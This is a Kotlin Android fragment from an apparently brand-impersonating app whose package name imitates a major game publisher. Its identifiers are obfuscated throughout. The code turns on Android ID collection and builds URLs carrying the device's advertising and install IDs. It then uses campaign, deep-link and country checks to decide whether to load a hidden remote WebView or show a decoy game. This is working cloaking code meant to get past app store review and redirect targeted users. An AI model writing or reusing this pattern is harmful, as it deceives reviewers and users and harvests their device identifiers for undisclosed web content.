package com.miHoYo.Gen

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import com.appsflyer.AppsFlyerLib
import com.miHoYo.Gen.coonnts.Utilgtgtgt.ad_idgttggt
import com.miHoYo.Gen.coonnts.Utilgtgtgt.appsgtgtgt
import com.miHoYo.Gen.coonnts.Utilgtgtgt.aps_idgtgt
import com.miHoYo.Gen.coonnts.Utilgtgtgt.codeCodegtgttg
import com.miHoYo.Gen.coonnts.Utilgtgtgt.geoCogtgt
import com.miHoYo.Gen.coonnts.Utilgtgtgt.gtggt
import com.miHoYo.Gen.coonnts.Utilgtgtgt.keyVAlgtgtgt
import com.miHoYo.Gen.coonnts.Utilgtgtgt.gttggt
import com.miHoYo.Gen.coonnts.Utilgtgtgt.gtjgtjgt
import com.miHoYo.Gen.coonnts.Utilgtgtgt.nammgtgtgt
import com.miHoYo.Gen.coonnts.Utilgtgtgt.onegtgtgt
import com.miHoYo.Gen.coonnts.Utilgtgtgt.paaakakakak
import com.miHoYo.Gen.coonnts.Utilgtgtgt.subFivegtgtgt
import com.miHoYo.Gen.coonnts.Utilgtgtgt.subFourgtgtgt
import com.miHoYo.Gen.coonnts.Utilgtgtgt.subOnegtgtgt
import com.miHoYo.Gen.coonnts.Utilgtgtgt.subSixgtgtgt
import com.miHoYo.Gen.coonnts.Utilgtgtgt.trolologtgt
import com.miHoYo.Gen.coonnts.Utilgtgtgt.gtkgtjiogt
import org.koin.android.ext.android.inject
import org.koin.core.qualifier.named


class FiiilalalaFragment : Fragment() {
    private lateinit var gthtghgt: Context
    val gtjitjotgjiogt: SharedPreferences by inject(named("SharedPreferences"))

    override fun onAttach(context: Context) {
        super.onAttach(context)
        gthtghgt = context
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.fragment_fiiilalala, container, false)
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        val countgtg = gtjitjotgjiogt.getString(geoCogtgt, null)
        val appCampgttg = gtjitjotgjiogt.getString("appCamp", null)
        val deepStgtgt = gtjitjotgjiogt.getString("deepSt", null)
        val countryDevgttg = gtjitjotgjiogt.getString(codeCodegtgttg, null)
        val appsgtgt = gtjitjotgjiogt.getString(appsgtgtgt, null)
        val wvgtgttg = gtjitjotgjiogt.getString(gtkgtjiogt, null)
        val mainIdgtgtgt = gtjitjotgjiogt.getString("mainId", null)
        val packgtgtgt = paaakakakak
        val buildVersgtgttg = Build.VERSION.RELEASE
        val myTrIdgtgtgt = gtjitjotgjiogt.getString(gtjgtjgt, null)
        val myInstIdgtgt: String? = gtjitjotgjiogt.getString(gtggt, null)

        val intentBeamgttggt = Intent(activity, VebbboboboActivity2::class.java)
        val intentGamegtgttg = Intent(activity, GaaaammmyyyActivity2::class.java)

        val afIdgtgtgt = AppsFlyerLib.getInstance().getAppsFlyerUID(gthtghgt)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)

        gtjitjotgjiogt.edit().putString(aps_idgtgt, afIdgtgtgt).apply()

        Log.d("lolo", "apps ${appsgtgt}")
        Log.d("lolo", "count ${countgtg}")
        Log.d("lolo", "countryDev ${countryDevgttg}")

        val linkAppsggtgt = "$wvgtgttg$subOnegtgtgt$appCampgttg&$onegtgtgt$afIdgtgtgt&$ad_idgttggt$mainIdgtgtgt&$subFourgtgtgt$packgtgtgt&$subFivegtgtgt$buildVersgtgttg&$subSixgtgtgt$nammgtgtgt"
        val linkMTgtgt = "$wvgtgttg$onegtgtgt$myTrIdgtgtgt&$ad_idgttggt$myInstIdgtgt&$subFourgtgtgt$packgtgtgt&$subFivegtgtgt$buildVersgtgttg&$subSixgtgtgt$nammgtgtgt"
        val gttgB = "$wvgtgttg$subOnegtgtgt$deepStgtgt&$onegtgtgt$afIdgtgtgt&$ad_idgttggt$mainIdgtgtgt&$subFourgtgtgt$packgtgtgt&$subFivegtgtgt$buildVersgtgttg&$subSixgtgtgt$trolologtgt"
        val linkFBNullAppsgtgtgt = "$wvgtgttg$subOnegtgtgt$deepStgtgt&$onegtgtgt$myTrIdgtgtgt&$ad_idgttggt$myInstIdgtgt&$subFourgtgtgt$packgtgtgt&$subFivegtgtgt$buildVersgtgttg&$subSixgtgtgt$trolologtgt"

        when(appsgtgt) {
            "1" ->
                if(appCampgttg!!.contains(keyVAlgtgtgt)) {
                    gtjitjotgjiogt.edit().putString(gttggt, linkAppsggtgt).apply()
                    gtjitjotgjiogt.edit().putString("WebInt", "campaign").apply()
                    startActivity(intentBeamgttggt)
                    activity?.finish()
                } else if (deepStgtgt!=null||countryDevgttg!!.contains(countgtg.toString())) {
                    gtjitjotgjiogt.edit().putString(gttggt, gttgB).apply()
                    gtjitjotgjiogt.edit().putString("WebInt", "deepLink").apply()
                    startActivity(intentBeamgttggt)
                    activity?.finish()
                } else {
                    startActivity(intentGamegtgttg)
                    activity?.finish()
                }
            "0" ->
                if(deepStgtgt!=null) {
                    gtjitjotgjiogt.edit().putString(gttggt, linkFBNullAppsgtgtgt).apply()
                    gtjitjotgjiogt.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(intentBeamgttggt)
                    activity?.finish()
                } else if (countryDevgttg!!.contains(countgtg.toString())) {
                    gtjitjotgjiogt.edit().putString(gttggt, linkMTgtgt).apply()
                    gtjitjotgjiogt.edit().putString("WebInt", "geo").apply()
                    startActivity(intentBeamgttggt)
                    activity?.finish()
                } else {
                    startActivity(intentGamegtgttg)
                    activity?.finish()
                }
        }
    }
}
